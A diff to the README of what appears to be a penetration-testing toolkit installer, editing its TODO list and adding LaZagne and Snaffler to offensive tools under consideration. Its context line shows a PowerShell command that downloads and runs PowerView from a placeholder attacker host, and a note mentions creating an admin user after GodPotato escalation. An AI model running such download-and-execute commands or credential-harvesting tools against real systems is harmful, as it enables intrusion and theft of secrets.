@@ -61,11 +61,11 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 ## TODOs
 
-- [AD] https://github.com/eladshamir/Whisker
-- [AD] https://github.com/ropnop/kerbrute
 - Download windows ligolo-ng agent binary and put in /opt/win for install.sh
 - Move unused tools out of requirements_\*.txt to optional_installs
-- Switch to pipx for installing tools like bloodhound and netexec
+- script to patch .local/share/navi/cheats
+- [OPTIONAL] automount usb
+- test pipewire
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
@@ -77,6 +77,7 @@ Below are things I will get around to trying and will add them to the install sc
 - https://github.com/BeichenDream/GodPotato
 - https://github.com/antonioCoco/RunasCs
 - Note: If using GodPotato, it's easier to create a new admin user and switch to them with RunasCs.
+- https://github.com/AlessandroZ/LaZagne or Snaffler
 
 ## Credit
 - https://github.com/AyoItsYas/Mainte
